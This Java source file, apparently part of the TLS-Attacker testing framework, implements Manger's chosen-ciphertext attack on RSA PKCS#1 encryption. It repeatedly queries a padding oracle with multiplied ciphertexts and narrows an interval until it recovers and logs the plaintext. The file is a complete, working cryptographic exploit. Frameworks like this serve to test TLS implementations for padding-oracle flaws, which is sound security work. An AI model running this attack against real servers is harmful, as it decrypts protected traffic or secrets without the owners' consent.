/**
 * TLS-Attacker - Anonymous submission
 *
 * Licensed under Apache License 2.0
 * http://www.apache.org/licenses/LICENSE-2.0
 */
package anonymous.tlsattacker.attacks.pkcs1;

import anonymous.tlsattacker.attacks.pkcs1.oracles.Pkcs1Oracle;
import anonymous.tlsattacker.util.ArrayConverter;
import anonymous.tlsattacker.util.MathHelper;
import java.math.BigInteger;

/**
 * Manger algorithm according to
 * https://www.iacr.org/archive/crypto2001/21390229.pdf
 * 
 * Original Python code written by Tibor Jager
 * 
 * @author anonymous anonymous - anonymous.anonymous@anonymous
 * @version 0.1
 */
public class Manger extends Pkcs1Attack {

    protected Interval result;

    private volatile boolean interrupted = false;

    public Manger(byte[] msg, Pkcs1Oracle pkcsOracle) {
	super(msg, pkcsOracle);
	// b computation
	int tmp = publicKey.getModulus().bitLength();
	tmp = (MathHelper.intceildiv(tmp, 8) - 1) * 8;
	bigB = BigInteger.ONE.shiftLeft(tmp);
	c0 = new BigInteger(1, encryptedMsg);
	LOGGER.debug("b: {}", ArrayConverter.bytesToHexString(bigB.toByteArray()));
    }

    public void attack() throws OracleException {
	BigInteger cc;

	LOGGER.info("Step 0:  Ensuring that m in [0,B)");
	BigInteger fx = BigInteger.ONE;
	if (!queryOracle(c0, fx)) {
	    BigInteger cx = c0;
	    fx = fx.add(BigInteger.ONE);
	    while (!interrupted) {
		cx = multiply(c0, fx);
		if (queryOracle(cx)) {
		    c0 = cx;
		    break;
		} else {
		    fx = fx.add(BigInteger.ONE);
		}
	    }
	}

	LOGGER.debug("Ciphertext after step 0: {}", ArrayConverter.bytesToHexString(c0.toByteArray()));

	LOGGER.info("Step 1");
	BigInteger f1 = new BigInteger("2");
	while (!interrupted) {
	    cc = multiply(c0, f1);
	    if (queryOracle(cc)) {
		f1 = f1.shiftLeft(1);
	    } else {
		break;
	    }
	}

	LOGGER.info("Step 2");
	// f2 = int(intfloordiv(N+B,B)*f1/2)
	BigInteger tmp = MathHelper.intfloordiv(publicKey.getModulus().add(bigB), bigB);
	BigInteger f2 = tmp.multiply(f1.shiftRight(1));
	while (!interrupted) {
	    cc = multiply(c0, f2);
	    if (!queryOracle(cc)) {
		f2 = f2.add(f1.shiftRight(1));
	    } else {
		break;
	    }
	}

	LOGGER.info("Step 3");
	BigInteger mmin = MathHelper.intceildiv(publicKey.getModulus(), f2);
	BigInteger mmax = MathHelper.intfloordiv(publicKey.getModulus().add(bigB), f2);

	result = new Interval(mmin, mmax);

	int previntervalsize = 0;
	while (!interrupted) {
	    BigInteger ftmp = MathHelper.intfloordiv(bigB.shiftLeft(1), mmax.subtract(mmin));
	    BigInteger i = MathHelper.intfloordiv(ftmp.multiply(mmin), publicKey.getModulus());
	    BigInteger f3 = MathHelper.intceildiv(i.multiply(publicKey.getModulus()), mmin);
	    cc = multiply(c0, f3);
	    if (!queryOracle(cc)) {
		mmin = MathHelper.intceildiv(i.multiply(publicKey.getModulus()).add(bigB), f3);
	    } else {
		mmax = MathHelper.intfloordiv(i.multiply(publicKey.getModulus()).add(bigB), f3);
	    }

	    if (mmax.equals(mmin)) {
		break;
	    }
	    // intervalsize = int(math.ceil(math.log(mmax-mmin)))
	    // if not intervalsize == previntervalsize:
	    // if intervalsize % 10 == 0:
	    // print ">> Manger running. Interval size:",intervalsize,"bit."
	    // previntervalsize=intervalsize
	}

	if (!interrupted) {
	    LOGGER.debug("Manger's attack solution (before inverse computation, if any): {}",
		    ArrayConverter.bytesToHexString(mmin.toByteArray()));

	    if (fx.equals(BigInteger.ONE)) {
		solution = mmin;
	    } else {
		BigInteger inverse = fx.modInverse(publicKey.getModulus());
		solution = mmin.multiply(inverse).mod(publicKey.getModulus());
	    }
	    LOGGER.info("Manger's attack solution (after inverse computation, if any): {}",
		    ArrayConverter.bytesToHexString(solution.toByteArray()));
	}
    }

    public boolean isInterrupted() {
	return interrupted;
    }

    public void setInterrupted(boolean interrupted) {
	this.interrupted = interrupted;
    }
}
